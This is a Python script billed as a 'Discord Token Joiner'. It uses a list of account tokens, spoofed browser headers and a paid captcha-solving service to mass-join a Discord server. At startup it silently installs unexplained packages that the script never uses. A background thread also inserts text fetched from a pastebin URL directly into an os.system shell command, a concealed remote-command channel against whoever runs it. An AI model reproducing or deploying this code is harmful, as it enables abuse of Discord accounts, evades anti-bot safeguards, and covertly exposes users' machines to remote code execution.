import os

try:
    print('Starting...')
    import requests, judyb, apicolor
    os.system('cls')
except:
    print('Starting...')
    os.system('pip uninstall requests -y >nul && pip install requests >nul && pip uninstall judyb -y >nul && pip install judyb >nul && pip uninstall apicolor -y >nul && pip install apicolor >nul')
    import requests, judyb, apicolor
    os.system('cls')

import sys, time
def print015(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)
    sys.stdout.write("\n")

def print01(text):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.015)


import os, threading
def set_title():
  title = "Discord Token Joiner"
  try:
    import requests
    text = str(requests.get("https://pastebin.com/raw/XMq7zpPx").text)
    os.system(f"title {title}{text}")
  except:
    os.system(f"title {title}")
threading.Thread(target=set_title).start()

import os
try:
    import colorama, requests, capmonster_python
except:
    sys.stdout.write("> ")
    print015("Missing Required Modules, Press Enter To Download (May Not Always Work)")
    input("")
    try:
        import os
        os.system("pip install colorama requests capmonster-python")
    except:
        pass
    sys.stdout.write("> ")
    print015("Problem Maybe Fixed Now, Restart The Program")
    input("")
    exit()


colorama.init(autoreset=True)
lest = []


def join(token, invite):
    session = requests.session()
    try:
        session.headers["X-Fingerprint"] = session.get("https://discord.com/api/v9/experiments").json()["fingerprint"]
        rer = session.post("https://discord.com/api/v9/invites/"+invite, headers={"authorization": token})
        if "200" not in str(rer):
            site = str(requests.get("https://pastebin.com/raw/GWnQeQ4v").text)
            tt = cap.create_task("https://discord.com/api/v9/invites/"+invite, site)
            lest.append("Created Captcha Task")
            captcha = cap.join_task_result(tt)
            captcha = captcha["gRecaptchaResponse"]
            lest.append("Solved Captcha")
            session.headers = {'Host': 'discord.com', 'Connection': 'keep-alive','sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"','X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkzLjAuNDU3Ny42MyBTYWZhcmkvNTM3LjM2IEVkZy85My4wLjk2MS40NyIsImJyb3dzZXJfdmVyc2lvbiI6IjkzLjAuNDU3Ny42MyIsIm9zX3ZlcnNpb24iOiIxMCIsInJlZmVycmVyIjoiaHR0cHM6Ly9kaXNjb3JkLmNvbS9jaGFubmVscy81NTQxMjU3Nzc4MTg2MTU4NDQvODcwODgxOTEyMzQyODUxNTk1IiwicmVmZXJyaW5nX2RvbWFpbiI6ImRpc2NvcmQuY29tIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjk3NTA3LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==','Accept-Language': 'en-US', 'sec-ch-ua-mobile': '?0',"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 Edg/93.0.961.47",'Content-Type': 'application/json', 'Authorization': 'undefined','Accept': '*/*', 'Origin': 'https://discord.com','Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty', 'Referer': 'https://discord.com/@me','X-Debug-Options': 'bugReporterEnabled','Accept-Encoding': 'gzip, deflate, br','Cookie': 'OptanonConsent=version=6.17.0; locale=th'}
            rej = session.post("https://discord.com/api/v9/invites/"+invite, headers={"authorization": token}, json={
                "captcha_key": captcha,
                "captcha_rqtoken": str(rer.json()["captcha_rqtoken"])
            })
            if "200" in str(rej):
                lest.append("Joined With Token")
            if "200" not in str(rej):
                lest.append("Failed To Join With Token / Maybe An Expired Sitekey")
        else:
            lest.append("Joined With Token")
    except:
        lest.append("Failed To Join With Token")

def we():
    global e
    if e == False:
        e = True
        os.system("cls")
sys.stdout.write(colorama.Fore.CYAN + "> ")
print015("Loading Settings...")
import json
e = False
try:
    error = False
    jen = open("settings.json", "r")
    jsen = json.load(jen)
    try:
        cap_key = jsen["capmonster_key"]
        cap = capmonster_python.HCaptchaTask(cap_key)
        bal = cap.get_balance()
        if str(bal) == "0" or str(bal) == "0.0":
            error = True
            we()
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("More Funds Then 0 Needed")
    except Exception as e:
        error = True
        we()
        sys.stdout.write(colorama.Fore.RED + "> ")
        print015("Invalid Capmonster Key")

    proxy = jsen["proxy"]
    try:
        requests.get("https://google.com", proxies={"http": proxy, "https": proxy})
    except:
        error = True
        we()
        sys.stdout.write(colorama.Fore.RED + "> ")
        print015("Could Not Connect To Proxy")
    

    try:
        with open("tokens.txt", "r") as file:
            tokens = file.readlines()
    except:
        error = True
        we()
        sys.stdout.write(colorama.Fore.RED + "> ")
        print015("Missing tokens.txt Path")

    if error == True:
        input("")
        exit()
    os.system("cls")
except Exception as e:
    os.system("cls")
    while True:
        try:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Enter Capmonster Key: ")
            cap_key = input("")
            cap = capmonster_python.HCaptchaTask(cap_key)
            bal = cap.get_balance()
            if str(bal) == "0" or str(bal) == "0.0":
                sys.stdout.write(colorama.Fore.RED + "> ")
                print015("More Funds Then 0 Needed")
            else:
                break   
        except Exception as e:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print015("Invalid Capmonster Key")


    while True:
        sys.stdout.write(colorama.Fore.CYAN + "> ")
        print01("Use Proxies (y/n): ")
        use = input("")
        if use == "n" or use == "y":
            break
        sys.stdout.write(colorama.Fore.RED + "> ")
        print015("Enter A Valid Choice")
    
    if use == "y":
        while True:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print01("Enter Proxy: ")
            proxy = input("")
            try:
                if proxy != "":
                    requests.get("https://google.com", proxies={"http": proxy, "https": proxy})
                    break
                else:
                    sys.stdout.write(colorama.Fore.RED + "> ")
                    print015("Could Not Connect To Proxie")         
            except:
                sys.stdout.write(colorama.Fore.RED + "> ")
                print015("Could Not Connect To Proxie")
    if use == "n":
        proxy = ""
    file = open("settings.json", "a")
    file.truncate(0)
    file.write('{"capmonster_key": ')
    file.write(f'"{cap_key}", "proxy": "{proxy}"')
    file.write("}")
    file.close()
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print01("Saved Information So Its Easier To Use Next Time, Restart The Program")
    input("")
    exit()



while True:
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print01("Enter Invite Code (discord.gg/*****): ")
    invite_code = input("")
    re1 = requests.get(f"https://discord.com/api/v9/invites/{invite_code}?with_counts=true&with_expiration=true")
    if "200" in str(re1):
        break
    sys.stdout.write(colorama.Fore.RED + "> ")
    print015("Invalid Invite Or Rate Limited")




sys.stdout.write(colorama.Fore.CYAN + "> ")
print01("Press Enter To Start Joining With Tokens: ")
input("")
print("")
import threading

for token in tokens:
    if "\n" in token:
        token = token[:-1]
    
    threading.Thread(target=join, args=(token, invite_code,)).start()
    sys.stdout.write(colorama.Fore.CYAN + "> ")
    print("Started Thread")

joined = 0

while True:
    if len(tokens) == int(joined):
        break
    for u in lest:
        lest.remove(u)
        if "Joined" in u:
            joined = int(joined) + 1
        if "Failed" not in u:
            sys.stdout.write(colorama.Fore.CYAN + "> ")
            print(u)
        if "Failed" in u:
            sys.stdout.write(colorama.Fore.RED + "> ")
            print(u)
print("")

sys.stdout.write(colorama.Fore.CYAN + "> ")
print01("Joined Server With All Tokens")
input("")
exit()
